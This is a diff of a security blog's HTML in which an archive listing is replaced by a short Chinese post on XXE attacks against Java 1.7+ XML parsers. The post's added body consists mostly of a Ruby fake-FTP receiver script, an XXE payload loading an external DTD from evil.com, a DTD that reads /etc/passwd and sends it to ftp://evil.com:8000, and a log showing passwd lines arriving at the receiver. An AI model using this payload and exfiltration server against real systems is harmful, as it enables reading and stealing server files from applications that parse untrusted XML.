@@ -6,14 +6,18 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://adrain09.github.io">
-  <title>Archives: 2017/1 | NoSec World</title>
+  <title>java 1.7+ xxe入侵 | NoSec World</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="NoSec World">
-<meta property="og:url" content="https://adrain09.github.io/archives/2017/01/index.html">
+  <meta name="description" content="Java 在1.7版本以上对gopher协议进行了修复，在1.7+处理不合法的url时候会爆出：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java 1.7+ xxe入侵">
+<meta property="og:url" content="https://adrain09.github.io/2017/02/05/web安全/JAVA1.7+ XXE实体入侵/index.html">
 <meta property="og:site_name" content="NoSec World">
+<meta property="og:description" content="Java 在1.7版本以上对gopher协议进行了修复，在1.7+处理不合法的url时候会爆出：">
+<meta property="og:updated_time" content="2017-02-06T03:58:08.255Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="NoSec World">
+<meta name="twitter:title" content="java 1.7+ xxe入侵">
+<meta name="twitter:description" content="Java 在1.7版本以上对gopher协议进行了修复，在1.7+处理不合法的url时候会爆出：">
   
     <link rel="alternative" href="/atom.xml" title="NoSec World" type="application/atom+xml">
   
@@ -159,346 +163,162 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-web安全/JAVA1.7+ XXE实体入侵" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      java 1.7+ xxe入侵
+    </h1>
+  
+
+        <a href="/2017/02/05/web安全/JAVA1.7+ XXE实体入侵/" class="archive-article-date">
+  	<time datetime="2017-02-05T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-05</time>
+</a>
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Java 在1.7版本以上对gopher协议进行了修复，在1.7+处理不合法的url时候会爆出：</p>
+<a id="more"></a>
+<p>错误：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">java.net.MalformedURLException: Illegal character in URL</div><div class="line">at sun.net.www.http.HttpClient.getURLFile(HttpClient.java:<span class="number">583</span>)</div><div class="line">at sun.net.www.protocol.http.HttpURLConnection.getRequestURI(HttpURLConnection.java:<span class="number">2298</span>)</div><div class="line">at sun.net.www.protocol.http.HttpURLConnection.writeRequests(HttpURLConnection.java:<span class="number">513</span>)</div><div class="line">...</div><div class="line">at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(XMLParser.java:<span class="number">141</span>)</div><div class="line">at com.sun.org.apache.xerces.internal.parsers.DOMParser.parse(DOMParser.java:<span class="number">243</span>)</div><div class="line">at com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderImpl.parse(DocumentBuilderImpl.java:<span class="number">347</span>)</div></pre></td></tr></table></figure>
+<p>XMLParser处理xml，提供了xml实体注入的风险</p>
+<p>要利用这个问题，可采用ftp方式接受服务器的数据信息：</p>
+<p>脚本地址：<a href="https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb" target="_blank" rel="external">https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb</a></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">require</span> <span class="string">'socket'</span></div><div class="line">server = TCPServer.new <span class="number">8000</span></div><div class="line">loop <span class="keyword">do</span></div><div class="line">  Thread.start(server.accept) <span class="keyword">do</span> <span class="params">|client|</span></div><div class="line">    puts <span class="string">"New client connected"</span></div><div class="line">    data = <span class="string">""</span></div><div class="line">    client.puts(<span class="string">"220 xxe-ftp-server"</span>)</div><div class="line">    loop &#123;</div><div class="line">        req = client.gets()</div><div class="line">        puts <span class="string">"&lt; "</span>+req</div><div class="line">        <span class="keyword">if</span> req.<span class="keyword">include</span>? <span class="string">"USER"</span></div><div class="line">            client.puts(<span class="string">"331 password please - version check"</span>)</div><div class="line">        <span class="keyword">else</span></div><div class="line">            puts <span class="string">"&gt; 230 more data please!"</span></div><div class="line">            client.puts(<span class="string">"230 more data please!"</span>)</div><div class="line">        <span class="keyword">end</span></div><div class="line">    &#125;</div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line">’‘’</div><div class="line"></div><div class="line">利用poc：</div><div class="line"></div><div class="line"><span class="string">``</span><span class="string">`xml</span></div><div class="line">&lt;?xml version="1.0"?&gt;</div><div class="line">&lt;!DOCTYPE a [</div><div class="line">   &lt;!ENTITY % asd SYSTEM "http://evil.com/ext.dtd"&gt;</div><div class="line">   %asd;</div><div class="line">   %rrr;</div><div class="line">]&gt;</div><div class="line">&lt;a&gt;&lt;/a&gt;</div></pre></td></tr></table></figure>
+<p>外部dtd：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % b SYSTEM &quot;file:///etc/passwd&quot;&gt;</div><div class="line">&lt;!ENTITY % c &quot;&lt;!ENTITY &amp;#37; rrr SYSTEM &apos;ftp://evil.com:8000/%b;&apos;&gt;&quot;&gt;</div></pre></td></tr></table></figure>
+<p>利用输入传递数据到ftp命令中去：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">New client connected</div><div class="line">&lt; USER anonymous</div><div class="line">&lt; PASS Java1.7.0_45@</div><div class="line">&gt; 230 more data please!</div><div class="line">&lt; TYPE I</div><div class="line">&gt; 230 more data please!</div><div class="line">&lt; CWD root:x:0:0:root:</div><div class="line">&gt; 230 more data please!</div><div class="line">&lt; CWD root:</div><div class="line">&gt; 230 more data please!</div><div class="line">&lt; CWD bin</div><div class="line">&gt; 230 more data please!</div><div class="line">&lt; CWD bash</div><div class="line">&gt; 230 more data please!</div><div class="line">&lt; daemon:x:1:1:daemon:</div></pre></td></tr></table></figure>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="http://p1.bpimg.com/567571/129b2c8f4c136458.jpg">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2017" class="archive-year">2017</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/01/23/web安全/DNS REBINDING攻击/" class="archive-article-date">
-  	<time datetime="2017-01-23T07:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-23</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/01/23/web安全/DNS REBINDING攻击/">DNS REBINDING</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/01/22/web安全/一道题目/" class="archive-article-date">
-  	<time datetime="2017-01-22T07:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-22</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/01/22/web安全/一道题目/">一道小题目</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/01/20/移动安全/微信函数收集/" class="archive-article-date">
-  	<time datetime="2017-01-20T01:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-20</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/01/20/移动安全/微信函数收集/">微信hook函数收集</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/移动安全/">移动安全</a></li></ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/01/19/智能硬件/破解智能灯泡/" class="archive-article-date">
-  	<time datetime="2017-01-19T06:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-19</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/01/19/智能硬件/破解智能灯泡/">破解智能灯泡</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/智能硬件/">智能硬件</a></li></ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/01/18/安全测试/facebook命令执行/" class="archive-article-date">
-  	<time datetime="2017-01-18T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-18</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/01/18/安全测试/facebook命令执行/">facebook 命令执行</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags"></i>
 		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全测试/">安全测试</a></li></ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=https://adrain09.github.io/2017/02/05/web安全/JAVA1.7+ XXE实体入侵/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/01/17/web安全/Blob_urls/" class="archive-article-date">
-  	<time datetime="2017-01-17T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-17</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/01/17/web安全/Blob_urls/">H5中的Object URL</a>
-    </h1>
-  
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
-	</div>
+  
+<nav id="article-nav">
+  
+    <a href="/2017/02/05/安全测试/XXE in uber/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          Uber xxe漏洞
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/02/03/数学/一些有意思的数学/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">一些有趣的数学</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
 
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/01/10/web安全/H5安全策略/" class="archive-article-date">
-  	<time datetime="2017-01-10T07:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-10</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/01/10/web安全/H5安全策略/">H5新增安全策略</a>
-    </h1>
-  
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
-	</div>
 
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/01/10/智能硬件/物联网安全设计/" class="archive-article-date">
-  	<time datetime="2017-01-10T06:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-10</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/01/10/智能硬件/物联网安全设计/">物联网安全设计</a>
-    </h1>
-  
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/智能硬件/">智能硬件</a></li></ul>
-	</div>
 
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/01/10/移动安全/加强版Smali Log注入/" class="archive-article-date">
-  	<time datetime="2017-01-10T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-10</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/01/10/移动安全/加强版Smali Log注入/">加强版smail注入</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/移动安全/">移动安全</a></li></ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/01/10/移动安全/mobSF架构分析/" class="archive-article-date">
-  	<time datetime="2017-01-10T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-10</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/01/10/移动安全/mobSF架构分析/">MobSF框架分析</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/移动安全/">移动安全</a></li></ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/2017/01/page/2/">2</a><a class="extend next" rel="next" href="/archives/2017/01/page/2/">Next &raquo;</a>
-    </nav>
-  
 
 
           </div>
@@ -521,8 +341,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
